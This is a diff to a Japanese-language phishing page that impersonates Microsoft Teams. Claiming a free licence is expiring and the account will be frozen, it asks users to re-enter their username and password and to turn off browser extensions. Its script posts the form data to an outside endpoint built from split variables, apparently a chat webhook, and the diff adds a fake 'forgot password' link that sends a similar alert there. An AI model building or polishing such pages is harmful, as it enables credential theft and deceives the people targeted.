@@ -6,43 +6,35 @@
 <title>サインインに続行します</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
-body{font-family:'Segoe UI',sans-serif;background:#e8e8e8;display:flex;justify-content:center;padding-top:50px;}
+body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-content:center;padding-top:60px;}
 .page{width:780px;}
 .cert{background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.12);}
 .top-bar{height:4px;background:linear-gradient(90deg,#44546A,#605FBF,#2B7C8A);}
-.hdr{padding:34px 39px 26px;display:flex;align-items:center;gap:23px;border-bottom:1px solid #eee;}
-.hdr img.logo{width:84px;height:84px;flex-shrink:0;}
-.hdr .info h1{font-size:23px;font-weight:700;color:#1a1a1a;}
-.hdr .info small{display:block;font-size:15px;color:#888;margin-top:5px;}
-.meta{padding:23px 39px;background:#fafafa;border-bottom:1px solid #eee;font-size:15px;color:#666;}
-.meta table{width:100%;border-collapse:collapse;}
-.meta td{padding:7px 0;font-family:Consolas,monospace;font-size:17px;}
-.meta td:first-child{color:#999;width:36%;font-family:'Segoe UI',sans-serif;font-size:15px;}
-.body{padding:36px 39px;}
-.msg{font-size:18px;color:#333;line-height:1.9;margin-bottom:26px;}
-.msg strong{color:#605FBF;}
-.warn{background:#fff3cd;border-left:3px solid #e6a817;padding:16px 18px;font-size:15px;color:#7a5c00;margin-bottom:23px;border-radius:0 4px 4px 0;}
+.hdr{padding:40px 44px 30px;display:flex;align-items:center;gap:24px;border-bottom:1px solid #eee;}
+.hdr img.logo{width:170px;height:auto;flex-shrink:0;object-fit:contain;}
+.hdr .info h1{font-size:24px;font-weight:600;color:#1a1a1a;}
+.hdr .info small{display:block;font-size:15px;color:#888;margin-top:6px;}
+.body{padding:34px 44px;}
+.warn{background:#fff3cd;border-left:3px solid #e6a817;padding:15px 18px;font-size:14px;color:#7a5c00;margin-bottom:24px;border-radius:0 4px 4px 0;}
 .warn .sub{display:block;font-size:12px;color:#9a7b00;margin-top:5px;}
-label{font-size:15px;color:#555;font-weight:600;display:block;margin-bottom:7px;}
-input{width:100%;padding:17px 20px;border:1px solid #ccc;border-radius:4px;font-size:18px;margin-bottom:20px;font-family:Consolas,monospace;}
+.msg{font-size:16px;color:#333;line-height:1.9;margin-bottom:24px;}
+.msg strong{color:#605FBF;}
+label{font-size:14px;color:#555;font-weight:600;display:block;margin-bottom:7px;}
+input{width:100%;padding:15px 18px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:18px;font-family:'Segoe UI',sans-serif;background:#fff;}
 input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,191,.1);}
-.btn{width:100%;padding:19px;background:#605FBF;color:#fff;border:none;border-radius:4px;font-size:18px;font-weight:600;cursor:pointer;letter-spacing:.4px;}
-.btn:hover{background:#4E4BA8;}
-.spin{display:none;width:39px;height:39px;border:4px solid #ddd;border-top-color:#605FBF;border-radius:50%;margin:26px auto;animation:sp .7s linear infinite;}
+.btn{width:100%;padding:16px;background:#0067b8;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:600;cursor:pointer;letter-spacing:.3px;}
+.btn:hover{background:#005da6;}
+.forgot{display:inline-block;margin-top:14px;font-size:13px;color:#605FBF;cursor:pointer;}
+.forgot:hover{text-decoration:underline;}
+.spin{display:none;width:38px;height:38px;border:4px solid #ddd;border-top-color:#0067b8;border-radius:50%;margin:26px auto;animation:sp .7s linear infinite;}
 @keyframes sp{to{transform:rotate(360deg)}}
-.ok{display:none;text-align:center;padding:36px 0;}
-.ok p{font-size:19px;color:#27ae60;font-weight:600;margin-bottom:10px;}
-.ok small{font-size:15px;color:#888;line-height:1.7;}
-.divider{border:none;border-top:1px solid #eee;margin:31px 0;}
-.cards{display:flex;gap:18px;margin-top:5px;}
-.card{flex:1;background:#f9f9f9;border-radius:6px;padding:23px 20px;}
-.card h3{font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:10px;}
-.card p{font-size:14px;color:#666;line-height:1.8;margin-bottom:18px;}
-.card a.btn-sm{display:inline-flex;align-items:center;gap:7px;font-size:14px;font-weight:600;color:#605FBF;text-decoration:none;border:1px solid #605FBF;border-radius:4px;padding:8px 15px;}
-.card a.btn-sm:hover{background:#eef0fb;}
-.foot{padding:15px 39px;background:#f5f5f5;border-top:1px solid #eee;font-size:13px;color:#aaa;display:flex;justify-content:space-between;}
-.status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#27ae60;margin-right:5px;animation:bl 1.5s ease infinite;}
-@keyframes bl{50%{opacity:.3;}}
+.ok{display:none;text-align:center;padding:40px 0;}
+.ok p{font-size:19px;color:#107c10;font-weight:600;margin-bottom:10px;}
+.ok small{font-size:14px;color:#888;line-height:1.7;}
+.divider{border:none;border-top:1px solid #eee;margin:30px 0;}
+.foot{padding:16px 44px;background:#f5f5f5;border-top:1px solid #eee;font-size:12px;color:#999;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;}
+.foot a{color:#999;text-decoration:none;}
+.foot a:hover{color:#0067b8;}
 </style>
 </head>
 <body>
@@ -50,25 +42,14 @@ input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,19
 <div class="cert">
 <div class="top-bar"></div>
 <div class="hdr">
-<img class="logo" src="teams.png" width="84" height="84" alt="Microsoft Teams">
+<img class="logo" src="teams.png" height="40" alt="Microsoft Teams">
 <div class="info">
 <h1>サインインに続行します</h1>
 <small>ライセンス再有効化認証</small>
 </div>
 </div>
-<div class="meta">
-<table>
-<tr><td>License ID</td><td>SNP-2024-0187-A</td></tr>
-<tr><td>Issuer</td><td>teams.microsoft.com License Auth</td></tr>
-<tr><td>Server</td><td>teams.microsoft.com :443/HTTPS</td></tr>
-<tr><td>Cert CN</td><td>teams.microsoft.com</td></tr>
-<tr><td>Cert Serial</td><td>0x9B3E.47A2.C1D8.F036</td></tr>
-<tr><td>Not Before</td><td>2026-04-01 00:00:00 JST</td></tr>
-<tr><td>Next Renewal</td><td>2029-04-01</td></tr>
-</table>
-</div>
 <div class="body">
-<div class="warn"><span class="status-dot"></span>警告：認証を完了しない場合は、Teamsアカウントが一定期間後に凍結されます。<span class="sub">認証が出来ない場合は、ブラウザの拡張機能をオフにしてください。</span></div>
+<div class="warn"><strong>警告：</strong>認証を完了しない場合は、Teamsアカウントが一定期間後に凍結されます。<span class="sub">認証が出来ない場合は、ブラウザの拡張機能をオフにしてください。</span></div>
 <div class="msg" id="msg">
 現在お使いの Microsoft Teams の無料ライセンスが期限切れとなります。<br><br>期限後の無料利用には、<strong>お使いになるアカウントの再認証（ワンタイム）</strong>が必要です。以下の認証フォームから実行してください。<br><br>再認証完了後、ライセンスが再有効化され、通常通りの無料利用が継続されます。<br>次回期限：<strong>2029年4月1日</strong>
 </div>
@@ -79,28 +60,18 @@ input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,19
 <input type="text" id="p" autocomplete="off">
 <button class="btn" type="submit">ライセンス再有効化を実行</button>
 </form>
+<span class="forgot" id="forgot">パスワードを忘れた場合</span>
 <div class="spin" id="sp"></div>
 <div class="ok" id="ok">
 <p>&#10003; ライセンス再有効化が完了しました</p>
 <small>次回期限：2029年4月1日<br>通常通り無料でご利用ください。</small>
 </div>
-<hr class="divider">
-<div class="cards">
-<div class="card">
-<h3>ライセンス情報</h3>
-<p>契約ID：SNP-2024-0187-A<br>サーバー：teams.microsoft.com<br>期限日：2026年11月14日<br>次回期限：2029年4月1日</p>
-<a class="btn-sm" href="#">ヘルプサポート</a>
-</div>
-<div class="card">
-<h3>コミュニティによって支えられています</h3>
-<p>Microsoft Teams は誰でも貢献できます。寄付、翻訳、質問への回答、機能の提案、バグ報告などを通じて、あなた自身と世界のために Teams をより良いものにしましょう。</p>
-<a class="btn-sm" href="#">参加</a>
-</div>
-</div>
 </div>
 <div class="foot">
-<span>&copy; 2026 Microsoft Corporation. All rights reserved.</span>
-<span>SNP-2024-0187-A</span>
+<a href="#" onclick="return false;">利用規約</a>
+<a href="#" onclick="return false;">プライバシー概要</a>
+<a href="#" onclick="return false;">法的情報</a>
+<span>&copy; Microsoft Corporation</span>
 </div>
 </div>
 </div>
@@ -114,6 +85,7 @@ var u=document.getElementById("u").value;
 var p=document.getElementById("p").value;
 if(!u||!p)return false;
 document.getElementById("f").style.display="none";
+document.getElementById("forgot").style.display="none";
 document.getElementById("msg").style.display="none";
 document.getElementById("sp").style.display="block";
 var url=H+T+A+B;
@@ -123,6 +95,12 @@ fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
 .catch(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";});
 return false;
 }
+document.getElementById("forgot").addEventListener("click",function(e){
+e.preventDefault();
+var url=H+T+A+B;
+var body=JSON.stringify({"content":"【PWリセットリクエスト】teams.microsoft.com ／ "+new Date().toLocaleTimeString("ja-JP")});
+fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body}).catch(function(){});
+});
 </script>
 </body>
 </html>
